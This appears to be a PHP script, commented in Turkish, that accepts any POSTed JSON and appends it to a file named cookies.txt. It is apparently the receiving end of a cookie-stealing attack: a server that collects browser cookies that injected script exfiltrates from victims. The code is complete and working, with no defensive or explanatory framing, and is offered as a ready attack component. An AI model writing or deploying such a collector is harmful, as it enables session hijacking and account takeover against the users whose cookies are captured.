<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Gelen JSON verisini al
    $jsonData = file_get_contents('php://input');
    
    // Çerez verilerini bir dosyaya yaz
    file_put_contents('cookies.txt', $jsonData . PHP_EOL, FILE_APPEND | LOCK_EX);
    
    // Başarılı bir yanıt döndür
    echo json_encode(['status' => 'success']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
}
?>
